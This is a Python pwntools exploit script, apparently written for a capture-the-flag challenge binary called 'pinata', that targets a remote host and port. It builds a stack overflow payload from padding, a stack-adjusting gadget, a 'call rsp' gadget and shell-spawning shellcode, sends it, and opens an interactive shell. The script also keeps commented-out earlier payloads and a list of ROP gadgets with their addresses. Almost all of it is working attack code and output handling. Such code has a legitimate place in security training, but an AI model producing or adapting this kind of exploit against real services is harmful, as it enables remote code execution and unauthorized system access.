import pwn

pwn.context.log_level = 'DEBUG'

elf = pwn.ELF('./pinata')
pwn.context.binary = elf
libc = pwn.ELF('./glibc/libc.so.6', checksec=False)

# p = elf.process()
p = pwn.remote('83.136.253.102', 42240)

# payload = pwn.asm(payload) + b'A' * 32

# payload = pwn.asm(pwn.shellcraft.sh())
# payload = payload + b'A' * 24
# payload = payload + pwn.p64(0x7fffffffdac8)
# print(payload)

# loads RSP with 0xDEADBEEF
# payload = b'AAAAAAAABBBBBBBBCCCCCCCC'
# payload += pwn.p64(0x7fffffffdb00)
# payload += b'DDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMM'
# payload += pwn.p64(0xDEADBEEF)

# interesting gadgets
# 0x000000000046055d : jmp rbp
# 0x0000000000418c22 : push rsp ; ret
# 0x00000000004023ce : pop rsp ; ret
# 0x000000000047a3db : mov rbp, rsp ; mov rsi, rbp ; syscall
# 0x000000000047e1d1 : mov ebx, dword ptr [rsp] ; add rsp, 0x30 ; ret
# 0x0000000000419898 : xor eax, eax ; add rsp, 8 ; ret
# 0x000000000046cf2f : nop ; add rsp, 0x18 ; ret                 # 24
# 0x000000000045c1b0 : mov eax, ecx ; add rsp, 0x148 ; ret       # 328
# 0x00000000004731af : mov eax, ecx ; add rsp, 0x38 ; ret        # 56
# 0x0000000000487e3b : mov eax, edx ; add rsp, 0x28 ; ret        # 40
# 0x000000000041830d : call rsp

payload = b'AAAAAAAABBBBBBBBCCCCCCCC'
payload += pwn.p64(0x46cf2f)
payload += b'DDDDDDDDEEEEEEEE'
payload += b'JJJJJJJJ'
payload += pwn.p64(0x41830d)
payload += pwn.asm(pwn.shellcraft.sh())

print(payload)
print(payload.hex())
print(len(payload), 'bytes')

# gdb = pwn.gdb.attach(p, gdbscript="""
#     b *reader+29
# """)

print(p.recvuntil(b'>> '))
p.sendline(payload)

p.interactive()
